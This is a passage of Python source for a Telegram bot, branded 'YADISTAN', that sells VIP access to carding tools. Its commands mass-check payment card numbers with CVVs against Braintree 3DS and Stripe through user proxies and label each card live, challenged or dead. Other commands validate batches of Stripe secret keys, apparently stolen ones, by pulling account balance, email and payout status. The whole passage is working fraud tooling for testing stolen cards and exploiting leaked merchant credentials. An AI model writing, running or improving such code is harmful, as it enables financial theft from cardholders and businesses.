                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg(), reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), reply_markup=kb)
        except:
            pass
    threading.Thread(target=my_function).start()

# ================== /vbvm — Braintree 3DS Mass ==================
@bot.message_handler(commands=["vbvm"])
def vbvm_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message, "<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/vbvm card1\ncard2\ncard3</b>")
            return
        if len(cards) > 50:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 50 𝗰𝗮𝗿𝗱𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        total = len(cards)
        proxy = get_proxy_dict(id)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message, f"<b>🛡️ 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝟯𝗗𝗦 𝗠𝗮𝘀𝘀\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>", reply_markup=stop_kb)
        live = dead = challenged = checked = 0
        results_lines = []
        def build_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h = f"<b>🛡️ 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝟯𝗗𝗦 𝗠𝗮𝘀𝘀\n{status}\n━━━━━━━━━━━━━━━━━━━━\n"
            h += f"📊 {checked}/{total} | ✅ {live} | ⚠️ {challenged} | ❌ {dead}\n━━━━━━━━━━━━━━━━━━━━\n"
            return h + "\n".join(results_lines[-15:]) + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"))
                except:
                    pass
                return
            cc = cc.strip()
            result = passed_gate(cc, proxy)
            checked += 1
            if "3DS Authenticate Attempt Successful" in result:
                status_emoji = "✅"; live += 1
            elif "3DS Challenge Required" in result:
                status_emoji = "⚠️"; challenged += 1
            else:
                status_emoji = "❌"; dead += 1
            results_lines.append(f"{status_emoji} <code>{cc}</code> → {result}")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg(), reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), reply_markup=kb)
        except:
            pass
    threading.Thread(target=my_function).start()

# ================== /sk — Stripe SK Single Card Checker ==================
@bot.message_handler(commands=["sk"])
def sk_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        # ── Flexible parsing: current msg + reply msg ──────────────────
        _card_re = re.compile(r'\d{13,19}[\|/ ]\d{1,2}[\|/ ]\d{2,4}[\|/ ]\d{3,4}')
        _sk_re   = re.compile(r'sk_(?:live|test)_\S+')

        def _extract_sk(text):
            m = _sk_re.search(text or '')
            return m.group(0) if m else None

        def _extract_card(text):
            for line in (text or '').split('\n'):
                line = line.strip()
                if _card_re.search(line):
                    # normalise separators → |
                    norm = re.sub(r'[\s/]+', '|', line)
                    cm = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', norm)
                    if cm:
                        return cm.group(1)
            return None

        cur_text   = message.text or ''
        reply_text = ''
        if message.reply_to_message and message.reply_to_message.text:
            reply_text = message.reply_to_message.text

        sk_key = _extract_sk(cur_text) or _extract_sk(reply_text)
        card   = _extract_card(cur_text) or _extract_card(reply_text)

        if not sk_key or not card:
            bot.reply_to(message,
                "<b>🔑 𝗦𝘁𝗿𝗶𝗽𝗲 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n\n"
                "𝗨𝘀𝗮𝗴𝗲:\n"
                "/sk sk_live_xxx\n"
                "4111111111111111|12|25|123\n\n"
                "𝗢𝗿 𝗿𝗲𝗽𝗹𝘆 𝗺𝗼𝗱𝗲:\n"
                "Reply to a message containing the SK key, then:\n"
                "/sk 4111111111111111|12|25|123</b>")
            return
        # ────────────────────────────────────────────────────────────────
        if not sk_key.startswith('sk_live_') and not sk_key.startswith('sk_test_'):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗦𝗞 𝗞𝗲𝘆. 𝗠𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 𝘀𝗸_𝗹𝗶𝘃𝗲_</b>")
            return
        proxy = get_proxy_dict(id)
        msg = bot.reply_to(message, f"<b>🔑 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... ⏳\n💳 𝗖𝗮𝗿𝗱: <code>{card}</code></b>")
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        start_time = time.time()
        result = stripe_sk_check(card, sk_key, proxy)
        execution_time = time.time() - start_time
        log_card_check(id, card, 'sk', result, exec_time=execution_time)
        if "Approved" in result or "Live" in result or "Processing" in result:
            status_emoji = "✅"
        elif "Insufficient" in result:
            status_emoji = "💰"
        elif "3DS" in result or "OTP" in result:
            status_emoji = "⚠️"
        else:
            status_emoji = "❌"
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(
            chat_id=message.chat.id, message_id=msg.message_id,
            text=f"""<b>#stripe_sk 🔑
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝗞: <code>{sk_key[:18]}...***</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>""",
            reply_markup=kb)
    threading.Thread(target=my_function).start()

# ================== /skm — Stripe SK Mass Checker ==================
@bot.message_handler(commands=["skm"])
def skm_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        # ── Flexible parsing: current msg + reply msg ──────────────────
        _sk_re_m  = re.compile(r'sk_(?:live|test)_\S+')
        _card_re_m = re.compile(r'\d{13,19}[\|/ ]\d{1,2}[\|/ ]\d{2,4}[\|/ ]\d{3,4}')

        def _find_sk(text):
            m = _sk_re_m.search(text or '')
            return m.group(0) if m else None

        def _find_cards(text):
            found = []
            for line in (text or '').split('\n'):
                line = line.strip()
                if _card_re_m.search(line):
                    norm = re.sub(r'[\s/]+', '|', line)
                    cm = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', norm)
                    if cm:
                        found.append(cm.group(1))
            return found

        cur_text   = message.text or ''
        reply_text = (message.reply_to_message.text or '') if message.reply_to_message else ''

        sk_key = _find_sk(cur_text) or _find_sk(reply_text)
        cards  = _find_cards(cur_text) or _find_cards(reply_text)
        # also allow: /skm sk_live_xxx\ncard1\ncard2 (SK on first line, cards below)
        if not cards:
            all_text = cur_text + '\n' + reply_text
            cards = _find_cards(all_text)
        # ────────────────────────────────────────────────────────────────
        if not sk_key:
            bot.reply_to(message, "<b>🔑 𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n\n𝗨𝘀𝗮𝗴𝗲:\n/skm sk_live_xxx\ncard1\ncard2\n\n𝗢𝗿 𝗿𝗲𝗽𝗹𝘆 𝗺𝗼𝗱𝗲:\nReply to SK key message → /skm card1\ncard2</b>")
            return
        if not sk_key.startswith('sk_live_') and not sk_key.startswith('sk_test_'):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗦𝗞 𝗞𝗲𝘆. 𝗠𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 𝘀𝗸_𝗹𝗶𝘃𝗲_</b>")
            return
        if not cards:
            # Check if user sent multiple SK keys (common mistake: /skm instead of /msk)
            all_text   = cur_text + '\n' + reply_text
            multi_sks  = re.findall(r'sk_(?:live|test)_[A-Za-z0-9]+', all_text)
            multi_sks  = list(dict.fromkeys(multi_sks))  # unique
            if len(multi_sks) > 1:
                bot.reply_to(message,
                    f"<b>ℹ️ Multiple SK keys mili ({len(multi_sks)})\n\n"
                    "SK keys check karne ke liye <code>/msk</code> use karein:\n\n"
                    "<code>/msk\n"
                    "sk_live_key1\n"
                    "sk_live_key2\n"
                    "sk_live_key3</code>\n\n"
                    "👉 <code>/skm</code> = ek SK key + cards\n"
                    "👉 <code>/msk</code> = multiple SK keys check</b>",
                    parse_mode='HTML')
            else:
                bot.reply_to(message,
                    "<b>❌ 𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.\n\n"
                    "𝗨𝘀𝗮𝗴𝗲:\n"
                    "<code>/skm sk_live_xxx\n"
                    "4111111111111111|12|25|123</code></b>",
                    parse_mode='HTML')
            return
        if len(cards) > 50:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 50 𝗰𝗮𝗿𝗱𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        total = len(cards)
        proxy = get_proxy_dict(id)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message, f"<b>🔑 𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗦𝗞: <code>{sk_key[:18]}...***</code>\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>", reply_markup=stop_kb)
        live = dead = insufficient = checked = 0
        results_lines = []
        def build_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h = f"<b>🔑 𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n{status}\n━━━━━━━━━━━━━━━━━━━━\n"
            h += f"📊 {checked}/{total} | ✅ {live} | 💰 {insufficient} | ❌ {dead}\n━━━━━━━━━━━━━━━━━━━━\n"
            return h + "\n".join(results_lines[-15:]) + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"))
                except:
                    pass
                return
            cc = cc.strip()
            start_time = time.time()
            result = stripe_sk_check(cc, sk_key, proxy)
            checked += 1
            if "Approved" in result or "Live" in result or "Processing" in result:
                status_emoji = "✅"; live += 1
            elif "Insufficient" in result:
                status_emoji = "💰"; insufficient += 1
            elif "3DS" in result or "OTP" in result:
                status_emoji = "⚠️"; live += 1
            else:
                status_emoji = "❌"; dead += 1
            cc_short = cc[:6] + "****" + cc.split('|')[0][-4:] if len(cc.split('|')[0]) > 10 else cc
            results_lines.append(f"{status_emoji} <code>{cc_short}</code> → {result}")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg(), reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), reply_markup=kb)
        except:
            pass
    threading.Thread(target=my_function).start()

# ================== /skchk — SK Key Validator ==================
@bot.message_handler(commands=["skchk"])
def skchk_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        try:
            sk_key = message.text.split(' ', 1)[1].strip()
        except IndexError:
            bot.reply_to(message, "<b>🔑 𝗦𝗞 𝗞𝗲𝘆 𝗩𝗮𝗹𝗶𝗱𝗮𝘁𝗼𝗿\n\n𝗨𝘀𝗮𝗴𝗲:\n/skchk sk_live_xxxxxx</b>")
            return
        if not sk_key.startswith('sk_live_') and not sk_key.startswith('sk_test_'):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗞𝗲𝘆 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗠𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 𝘀𝗸_𝗹𝗶𝘃𝗲_ 𝗼𝗿 𝘀𝗸_𝘁𝗲𝘀𝘁_</b>")
            return
        msg = bot.reply_to(message, "<b>🔍 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗦𝗞 𝗞𝗲𝘆... ⏳</b>")
        start_time = time.time()
        try:
            # /v1/balance — live/dead + amount info (like reference tool)
            bal_resp = requests.get(
                'https://api.stripe.com/v1/balance',
                auth=(sk_key, ''),
                timeout=15
            )
            bal_data = bal_resp.json()
            execution_time = time.time() - start_time

            if '"available"' in bal_resp.text and bal_resp.status_code == 200:
                # Key is LIVE — extract balance details
                avail_list  = bal_data.get('available', [{}])
                amount      = avail_list[0].get('amount', 0) if avail_list else 0
                currency    = avail_list[0].get('currency', 'usd').upper() if avail_list else 'N/A'
                livemode    = bal_data.get('livemode', False)

                # determine balance status
                if int(amount) > 0:
                    balance_status = f"✅ 𝗣𝗼𝘀𝗶𝘁𝗶𝘃𝗲 ({amount/100:.2f} {currency})"
                    status_emoji   = "✅"
                    status_text    = "𝗟𝗜𝗩𝗘 🟢"
                elif int(amount) == 0:
                    balance_status = f"⚠️ 𝗭𝗲𝗿𝗼 (0.00 {currency})"
                    status_emoji   = "⚠️"
                    status_text    = "𝗟𝗜𝗩𝗘 (𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝟬) 🟡"
                else:
                    balance_status = f"⛔ 𝗡𝗲𝗴𝗮𝘁𝗶𝘃𝗲 ({amount/100:.2f} {currency})"
                    status_emoji   = "⚠️"
                    status_text    = "𝗟𝗜𝗩𝗘 (𝗡𝗲𝗴𝗮𝘁𝗶𝘃𝗲) 🔴"

                # also fetch /v1/account for extra details
                try:
                    acc_resp = requests.get(
                        'https://api.stripe.com/v1/account',
                        auth=(sk_key, ''),
                        timeout=10
                    )
                    acc_data = acc_resp.json() if acc_resp.status_code == 200 else {}
                except:
                    acc_data = {}

                acct_id  = acc_data.get('id', 'N/A')
                email    = acc_data.get('email', 'N/A')
                country  = acc_data.get('country', 'N/A')
                charges  = acc_data.get('charges_enabled', False)
                payouts  = acc_data.get('payouts_enabled', False)

                details = (
                    f"[ϟ] 𝗔𝗰𝗰𝗼𝘂𝗻𝘁: <code>{acct_id}</code>\n"
                    f"[ϟ] 𝗘𝗺𝗮𝗶𝗹: {email}\n"
                    f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}\n"
                    f"[ϟ] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆: {currency}\n"
                    f"[ϟ] 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance_status}\n"
                    f"[ϟ] 𝗟𝗶𝘃𝗲𝗺𝗼𝗱𝗲: {'✅ Yes' if livemode else '🔸 Test'}\n"
                    f"[ϟ] 𝗖𝗵𝗮𝗿𝗴𝗲𝘀: {'✅' if charges else '❌'}\n"
                    f"[ϟ] 𝗣𝗮𝘆𝗼𝘂𝘁𝘀: {'✅' if payouts else '❌'}"
                )
            else:
                err_msg      = bal_data.get('error', {}).get('message', 'Invalid Key')
                status_emoji = "❌"
                status_text  = "𝗗𝗘𝗔𝗗 🔴"
                details      = f"[ϟ] 𝗥𝗲𝗮𝘀𝗼𝗻: {err_msg[:100]}"

        except Exception as e:
            execution_time = time.time() - start_time
            status_emoji = "⚠️"
            status_text  = "𝗘𝗿𝗿𝗼𝗿"
            details = f"[ϟ] 𝗘𝗿𝗿𝗼𝗿: {str(e)[:100]}"

        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(
            chat_id=message.chat.id, message_id=msg.message_id,
            text=f"""<b>#SK_Checker 🔑
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗦𝗞: <code>{sk_key[:20]}...***</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {status_text} {status_emoji}
- - - - - - - - - - - - - - - - - - - - - - -
{details}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>""",
            reply_markup=kb)
    threading.Thread(target=my_function).start()

# ================== /msk — Mass SK Key Checker ==================
@bot.message_handler(commands=["msk"])
def msk_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        # Extract all SK keys from anywhere in the message (handles concatenated keys too)
        _sk_re_msk = re.compile(r'sk_(?:live|test)_[A-Za-z0-9]+')
        full_text   = message.text or ''
        # Remove the /msk command part before scanning
        full_text   = re.sub(r'^/msk\S*\s*', '', full_text, count=1).strip()
        sk_keys     = list(dict.fromkeys(_sk_re_msk.findall(full_text)))  # unique, order preserved
        if not sk_keys:
            bot.reply_to(message,
                "<b>🔑 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n\n"
                "𝗨𝘀𝗮𝗴𝗲:\n"
                "<code>/msk\n"
                "sk_live_key1\n"
                "sk_live_key2\n"
                "sk_live_key3</code></b>",
                parse_mode='HTML')
            return
        if len(sk_keys) > 30:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 30 𝗸𝗲𝘆𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        total = len(sk_keys)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message, f"<b>🔑 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗸𝗲𝘆𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>", reply_markup=stop_kb)
        live = dead = checked = 0
        results_lines = []
        def build_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h = f"<b>🔑 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n{status}\n━━━━━━━━━━━━━━━━━━━━\n"
            h += f"📊 {checked}/{total} | ✅ {live} | ❌ {dead}\n━━━━━━━━━━━━━━━━━━━━\n"
            return h + "\n".join(results_lines[-15:]) + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
        for sk in sk_keys:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"))
                except:
                    pass
                return
            start_time = time.time()
            try:
                r = requests.get(
                    'https://api.stripe.com/v1/balance',
                    auth=(sk, ''),
                    timeout=12
                )
                data = r.json()
                if '"available"' in r.text and r.status_code == 200:
                    avail = data.get('available', [{}])
                    amount = avail[0].get('amount', 0) if avail else 0
                    currency = avail[0].get('currency', 'usd').upper() if avail else 'N/A'
                    livemode = '✅' if data.get('livemode') else '🔸Test'
                    bal_str = f"{amount/100:.2f} {currency}"
                    result_text = f"𝗟𝗜𝗩𝗘 | Bal:{bal_str} | Live:{livemode}"
                    status_emoji = "✅"; live += 1
                else:
                    err = data.get('error', {}).get('message', 'Invalid')[:40]
                    result_text = f"𝗗𝗲𝗮𝗱 | {err}"
                    status_emoji = "❌"; dead += 1
            except Exception as e:
                result_text = f"𝗘𝗿𝗿𝗼𝗿 | {str(e)[:40]}"
                status_emoji = "⚠️"; dead += 1
            checked += 1
            sk_short = sk[:18] + '...***'
            results_lines.append(f"{status_emoji} <code>{sk_short}</code> → {result_text}")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg(), reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), reply_markup=kb)
        except:
            pass
    threading.Thread(target=my_function).start()

@bot.message_handler(content_types=["document"])
def main(message):
        name = message.from_user.first_name
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        id=message.from_user.id
        
        try:BL=(json_data[str(id)]['plan'])
        except:
            BL='𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            with open("data.json", 'r', encoding='utf-8') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                str(id) : {
      "plan": "𝗙𝗥𝗘𝗘",
      "timer": "none",
                }
            }
    
            existing_data.update(new_data)
            with open("data.json", 'w', encoding='utf-8') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)       
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
            keyboard.add(contact_button)
            bot.send_message(chat_id=message.chat.id, text=f'''<b>🌟 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌟

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『yadistan』</b>
''',reply_markup=keyboard)
            return
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
            date_str=json_data[str(id)]['timer'].split('.')[0]
        try:
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
        except Exception as e:
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
            keyboard.add(contact_button)
            bot.send_message(chat_id=message.chat.id, text=f'''<b>🌟 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌟

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『YADISTAN』</b>
''',reply_markup=keyboard)
            return
        current_time = datetime.now()
        required_duration = timedelta(hours=0)
        if current_time - provided_time > required_duration:
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
            keyboard.add(contact_button)
            bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>
                ''',reply_markup=keyboard)
            with open("data.json", 'r', encoding='utf-8') as file:
                json_data = json.load(file)
            json_data[str(id)]['timer'] = 'none'
            json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
            with open("data.json", 'w', encoding='utf-8') as file:
                json.dump(json_data, file, indent=2)
            return
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        paypal_button = types.InlineKeyboardButton(text="𝗣𝗮𝘆𝗣𝗮𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ☑️", callback_data='pp_file')
        passed_button = types.InlineKeyboardButton(text="𝗣𝗮𝘀𝘀𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 🔥", callback_data='passed_file')
